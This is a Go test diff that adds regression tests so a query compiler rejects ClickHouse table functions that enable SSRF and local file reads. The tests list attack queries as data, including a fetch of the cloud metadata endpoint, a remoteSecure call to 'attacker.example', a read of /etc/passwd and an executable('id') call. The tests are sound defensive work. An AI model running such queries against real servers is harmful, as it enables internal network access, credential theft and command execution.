@@ -40,6 +40,48 @@ func TestCompileRejectsNonSelectSQLKeyword(t *testing.T) {
 	}
 }
 
+// TestCompileRejectsSSRFTableFunctions guards against a real finding: a
+// SELECT-only, keyword-blocklist check alone doesn't stop ClickHouse's
+// built-in table functions, which let an otherwise-ordinary read-only
+// SELECT make ClickHouse itself issue an outbound request (url,
+// remote/remoteSecure, mysql, postgresql, s3, hdfs, ...) or read a local
+// file (file) on the caller's behalf -- an SSRF/file-read primitive
+// reachable by RoleViewer, the platform's lowest role.
+func TestCompileRejectsSSRFTableFunctions(t *testing.T) {
+	queries := []string{
+		`SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'LineAsString', 's String')`,
+		`select * from remote('internal-host:9000', system, tables)`,
+		`SELECT * FROM remoteSecure('attacker.example:9440', db, tbl, 'user', 'pass')`,
+		`select * from mysql('host:3306', 'db', 'table', 'user', 'pass')`,
+		`SELECT * FROM postgresql('host:5432', 'db', 'table', 'user', 'pass')`,
+		`select * from s3('https://bucket.s3.amazonaws.com/key', 'CSV')`,
+		`SELECT * FROM hdfs('hdfs://host:9000/path', 'CSV')`,
+		`select * from file('/etc/passwd', 'LineAsString')`,
+		`SELECT * FROM odbc('DSN=foo', 'db', 'table')`,
+		`select * from executable('id', 'TSV', 'x String')`,
+		`SELECT * FROM cluster('some_cluster', system, tables)`,
+	}
+	for _, q := range queries {
+		if _, err := Compile(q, SQL, fixedNow); err == nil {
+			t.Errorf("expected Compile(%q) to reject a table-function SSRF vector, got no error", q)
+		}
+	}
+}
+
+// TestCompileAllowsOrdinaryColumnNamesResemblingTableFunctions makes
+// sure the table-function blocklist only fires on actual function-call
+// syntax (name immediately followed by "(") and not merely a column or
+// identifier that happens to share a name with a blocked function.
+func TestCompileAllowsOrdinaryColumnNamesResemblingTableFunctions(t *testing.T) {
+	plan, err := Compile(`SELECT cluster_id, file_name FROM logs WHERE cluster_id = 1`, SQL, fixedNow)
+	if err != nil {
+		t.Fatalf("Compile() error = %v", err)
+	}
+	if plan.RawSQL == "" {
+		t.Fatal("expected RawSQL to be set")
+	}
+}
+
 func TestCompileExplicitLanguageOverridesAutoDetect(t *testing.T) {
 	// "select" as a bare free-text search term -- would be misdetected
 	// as SQL by the heuristic alone, hence the override.
